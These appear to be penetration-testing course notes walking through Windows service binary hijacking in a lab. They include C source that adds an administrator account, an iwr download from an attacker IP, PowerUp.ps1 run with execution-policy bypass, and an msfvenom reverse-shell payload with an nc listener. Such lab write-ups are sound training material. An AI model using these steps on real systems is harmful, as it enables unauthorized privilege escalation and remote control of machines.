Service Binary Hijacking

To get a list of all installed Windows services, we can choose various methods such as the GUI snap-in services.msc
Get-CimInstance 
Get-WmiObject

PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                           State   PathName
----                                 -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
mysql                           Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql

Based on the output in Listing 40, the two XAMPP services Apache2.4 and mysql stand out as the binaries are located in the C:\xampp\ directory instead of C:\Windows\System32. This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software. These circumstances make it potentially prone to service binary hijacking.


Let's use icacls on the Apache binary httpd.exe first.

PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)
                              
                              
Next, we'll check mysqld.exe from the mysql service.

PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Let's create a small binary on Kali, which we'll use to replace the original mysqld.exe. The following C code will create a user named dave2 and add that user to the local Administrators group using the system5 function. The cross-compiled version of this code will serve as our malicious binary. Let's save it on Kali in a file named adduser.c.

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}


kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

PS C:\Users\dave> iwr -uri http://192.168.45.234/adduser.exe -Outfile adduser.exe  
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

In order to execute the binary through the service, we need to restart it. We can use the net stop command to stop the service.
net stop mysql

Since we do not have permission to manually restart the service, we must consider another approach. If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.
Let's check the Startup Type of the mysql service with the help of the Get-CimInstance Cmdlet by selecting Name and StartMode as well as filter for the string "mysql" with Where-Object.

PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto


PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled


We can issue a reboot with shutdown and the arguments /r (reboot instead of shutdown) and /t 0 (in zero seconds).
shutdown /r /t 0

Once the reboot is complete, we connect again as dave via RDP and open a PowerShell window. Because of the issued reboot and the Startup type auto, the service should have executed the executable file we placed to replace the original mysql service binary.

To confirm that our attack worked, let's list the members of the local Administrators group with Get-LocalGroupMember to check if dave2 was created and added to it.
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local


let's review an automated tool named PowerUp.ps1
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

victim
iwr -uri http://192.168.45.234/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'

if fail we go to manual binary exploitation like above

In this section, we first enumerated services and their binary permissions. After we identified that the group Users, and therefore, our user dave, has Full Access to the binary mysqld.exe, we cross-compiled a small binary creating an administrative user named dave2. After we copied it to the target system, we replaced mysqld.exe with our binary. Since we couldn't restart the service, we needed to reboot the system. After the system was rebooted, the service mysql started and dave2 was created and added to the local group Administrators.


Q1
do same above, at end run powershell as admin, choose more and select dave2

Q2
there is 2 ways to solve, like the above and using msfvenom to get a reverse shell after restarting the target
PS C:\Users\milena\Desktop> net stop backupmonitor

PS C:\Users\milena\Desktop> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'backupmonitor'}

Name          StartMode
----          ---------
BackupMonitor Auto

replace BackupMonitor.exe
shutdown /r /t 0

2nd method
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.234 LPORT=4444 -f exe > BackupMonitor.exe
nc -lvnp 4444
net stop backupmonitor
replace BackupMonitor.exe
shutdown /r /t 0
